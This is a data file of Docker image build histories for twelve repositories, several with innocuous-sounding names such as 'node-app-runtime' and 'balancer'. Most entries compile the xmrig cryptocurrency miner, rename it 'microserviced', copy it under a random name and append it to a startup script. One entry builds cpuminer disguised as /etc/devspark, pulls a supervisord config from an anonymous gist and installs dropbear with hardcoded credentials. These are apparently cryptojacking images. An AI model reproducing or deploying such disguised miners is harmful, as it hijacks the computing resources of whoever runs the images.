tecexokel/asphixel; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
lamiki/prey-dock; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
satamu/ledger; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
82zge/zagit; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
angler/devspark; b'ADD file:92ab746eb22dd3ed2b87469c719adf3c1bed7302653bbd76baafd7cfd95e911e /\nENV URL=https://github.com USERPASS=dev:key ALGORITHM=scrypt\nRUN apk update ;    apk add curl libgcc dropbear supervisor ;    apk add -t build-deps autoconf automake curl-dev gcc git make musl-dev pkgconfig ;    URL_CONF=https://gist.githubusercontent.com/anonymous/26c7742a5833ccb11fbc6a1436562dc4/raw/ce032d40f446e404f747d8ce55d3a1f6c03242b1 ;    curl -sSL "${URL_CONF}" -o /supervisord.conf ;    git clone https://github.com/pooler/cpuminer ;    cd cpuminer ;    ./autogen.sh ;    ./configure CFLAGS="-O3" ;    make ;    mv ./minerd /etc/devspark ;    cd .. & rm -rf cpuminer ;    rm -rf /var/cache/apk/* ;    apk del build-deps\nCMD ["/usr/bin/supervisord"]'
88xau/xuia; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
firstgen/rogmp; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
dacinuyufe/faser; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
currentvalue/corsar; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
recite/milta; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
coreruntime/node-app-runtime; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b open https://github.com/cryptocheck/chatik.git && cd chatik && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /chatik && cd /chatik && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /chatik\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
nixinus/balancer; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
